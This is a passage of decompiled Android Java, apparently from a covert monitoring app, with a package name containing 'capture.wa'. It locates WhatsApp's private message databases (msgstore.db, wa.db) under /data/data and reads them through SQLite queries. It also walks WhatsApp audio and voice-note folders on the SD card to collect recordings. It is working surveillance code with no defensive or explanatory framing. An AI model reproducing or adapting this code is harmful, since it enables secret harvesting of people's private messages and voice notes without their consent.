    //   57: astore 11
    //   59: aload_0
    //   60: astore 4
    //   62: aload_0
    //   63: aload 6
    //   65: aconst_null
    //   66: aconst_null
    //   67: aconst_null
    //   68: aconst_null
    //   69: aconst_null
    //   70: aload 9
    //   72: aload 11
    //   74: invokevirtual 503	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   77: astore 7
    //   79: aload 7
    //   81: ifnull +136 -> 217
    //   84: aload 7
    //   86: invokeinterface 729 1 0
    //   91: istore 12
    //   93: iload 12
    //   95: ifeq +54 -> 149
    //   98: ldc 118
    //   100: astore 4
    //   102: aload 7
    //   104: aload 4
    //   106: invokeinterface 96 2 0
    //   111: istore 12
    //   113: aload 7
    //   115: iload 12
    //   117: invokeinterface 195 2 0
    //   122: lstore 13
    //   124: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   127: istore 10
    //   129: iload 10
    //   131: ifeq +3 -> 134
    //   134: aload 7
    //   136: ifnull +10 -> 146
    //   139: aload 7
    //   141: invokeinterface 116 1 0
    //   146: lload 13
    //   148: lreturn
    //   149: lconst_0
    //   150: lstore 13
    //   152: goto -28 -> 124
    //   155: astore 4
    //   157: aconst_null
    //   158: astore 7
    //   160: lload_2
    //   161: lstore 13
    //   163: getstatic 23	com/vvt/capture/wa/full/a:MyUncaughtExceptionHandler	Z
    //   166: istore 10
    //   168: iload 10
    //   170: ifeq +3 -> 173
    //   173: aload 7
    //   175: ifnull -29 -> 146
    //   178: goto -39 -> 139
    //   181: astore 4
    //   183: aload_1
    //   184: ifnull +9 -> 193
    //   187: aload_1
    //   188: invokeinterface 116 1 0
    //   193: aload 4
    //   195: athrow
    //   196: astore 4
    //   198: aload 7
    //   200: astore_1
    //   201: goto -18 -> 183
    //   204: astore 4
    //   206: lload_2
    //   207: lstore 13
    //   209: goto -46 -> 163
    //   212: astore 8
    //   214: goto -51 -> 163
    //   217: lload_2
    //   218: lstore 13
    //   220: goto -96 -> 124
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	223	0	paramSQLiteDatabase	SQLiteDatabase
    //   1	200	1	localObject1	Object
    //   4	214	2	l1	long
    //   7	98	4	localObject2	Object
    //   155	1	4	localException1	Exception
    //   181	13	4	localObject3	Object
    //   196	1	4	localObject4	Object
    //   204	1	4	localException2	Exception
    //   10	3	5	i	int
    //   17	47	6	localObject5	Object
    //   20	179	7	localCursor	Cursor
    //   24	29	8	str1	String
    //   212	1	8	localException3	Exception
    //   39	32	9	str2	String
    //   49	120	10	bool1	boolean
    //   57	16	11	str3	String
    //   91	3	12	bool2	boolean
    //   111	5	12	j	int
    //   122	97	13	l2	long
    // Exception table:
    //   from	to	target	type
    //   12	17	155	java/lang/Exception
    //   29	32	155	java/lang/Exception
    //   34	39	155	java/lang/Exception
    //   72	77	155	java/lang/Exception
    //   12	17	181	finally
    //   29	32	181	finally
    //   34	39	181	finally
    //   72	77	181	finally
    //   84	91	196	finally
    //   104	111	196	finally
    //   115	122	196	finally
    //   124	127	196	finally
    //   163	166	196	finally
    //   84	91	204	java/lang/Exception
    //   104	111	204	java/lang/Exception
    //   115	122	204	java/lang/Exception
    //   124	127	212	java/lang/Exception
  }
  
  private static c b(String paramString1, long paramLong1, long paramLong2, String paramString2, String paramString3)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    for (;;)
    {
      try
      {
        localHashtable = new java/util/Hashtable;
        localHashtable.<init>();
        localObject3 = new java/io/File;
        localObject4 = "/sdcard/WhatsApp/media/WhatsApp Audio";
        localObject4 = com.vvt.io.d.h((String)localObject4);
        ((File)localObject3).<init>((String)localObject4);
        localObject4 = "AUD-%s-WA";
        localHashtable.put(localObject3, localObject4);
        localObject3 = new java/io/File;
        localObject4 = "/sdcard/WhatsApp/media/WhatsApp Voice Notes";
        localObject4 = com.vvt.io.d.h((String)localObject4);
        ((File)localObject3).<init>((String)localObject4);
        localObject4 = "PTT-%s-WA";
        localHashtable.put(localObject3, localObject4);
        localEnumeration = localHashtable.keys();
        localObject5 = null;
      }
      catch (Exception localException2)
      {
        Hashtable localHashtable;
        Object localObject3;
        Object localObject4;
        Enumeration localEnumeration;
        Object localObject5;
        Object localObject6;
        boolean bool2;
        boolean bool3 = c;
        if (!bool3) {
          continue;
        }
        continue;
        Object localObject2;
        continue;
      }
      try
      {
        bool1 = localEnumeration.hasMoreElements();
        if (!bool1) {
          continue;
        }
        localObject1 = localEnumeration.nextElement();
        localObject1 = (File)localObject1;
        localObject6 = localHashtable.get(localObject1);
        localObject6 = (String)localObject6;
        localObject3 = paramString1;
        localObject1 = com.vvt.capture.wa.b.a.a((File)localObject1, paramString1, paramLong1, paramLong2, (String)localObject6, paramString2, paramString3);
        localObject3 = ((c)localObject1).b;
        bool2 = com.vvt.ag.b.a((String)localObject3);
        if (bool2) {
          continue;
        }
        localObject4 = new java/io/File;
        ((File)localObject4).<init>((String)localObject3);
        bool3 = ((File)localObject4).exists();
        if (!bool3) {
          continue;
        }
      }
      catch (Exception localException1)
      {
        localObject2 = localObject5;
        continue;
        localObject2 = localObject5;
        continue;
        localObject5 = localObject2;
      }
      return (c)localObject1;
      localObject5 = localObject1;
    }
  }
  
  public static List b()
  {
    int i = 2;
    int j = 1;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject = new Object[i];
    localObject[0] = "/data/data";
    localObject[j] = "com.whatsapp";
    String str = String.format("%s/%s/databases", (Object[])localObject);
    localObject = new java/lang/StringBuilder;
    ((StringBuilder)localObject).<init>();
    str = str + "/msgstore.db";
    localArrayList.add(str);
    localObject = new Object[i];
    localObject[0] = "/dbdata/databases";
    localObject[j] = "com.whatsapp";
    str = String.format("%s/%s", (Object[])localObject);
    localObject = new java/lang/StringBuilder;
    ((StringBuilder)localObject).<init>();
    str = str + "/msgstore.db";
    localArrayList.add(str);
    return localArrayList;
  }
  
  public static boolean b(String paramString)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    try
    {
      localSQLiteDatabase = com.vvt.capture.wa.b.b.a(paramString);
      boolean bool = a(localSQLiteDatabase);
      return bool;
    }
    finally
    {
      if (localSQLiteDatabase != null) {
        localSQLiteDatabase.close();
      }
    }
  }
  
  private static String c(String paramString)
  {
    return paramString.replaceAll("[\\\\/:*?\"<>|]", "");
  }
  
  public static String[] c()
  {
    int i = 1;
    int j = 2;
    String[] arrayOfString = new String[4];
    Object[] arrayOfObject = new Object[j];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[i] = "com.whatsapp";
    String str = String.format("%s/%s/databases", arrayOfObject);
    arrayOfString[0] = str;
    arrayOfObject = new Object[j];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[i] = "com.whatsapp";
    str = String.format("%s/%s", arrayOfObject);
    arrayOfString[j] = str;
    return arrayOfString;
  }
  
  public static boolean d()
  {
    boolean bool1 = a;
    if (bool1) {}
    boolean bool2 = false;
    SQLiteDatabase localSQLiteDatabase = null;
    String str1 = "com.whatsapp";
    String str2 = "wa.db";
    try
    {
      localSQLiteDatabase = com.vvt.capture.wa.b.b.a(str1, str2);
      bool1 = a(localSQLiteDatabase);
      if (localSQLiteDatabase != null) {
        localSQLiteDatabase.close();
      }
      bool2 = a;
      if (bool2) {}
      return bool1;
    }
    finally
    {
      if (localSQLiteDatabase != null) {
        localSQLiteDatabase.close();
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wa/full/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */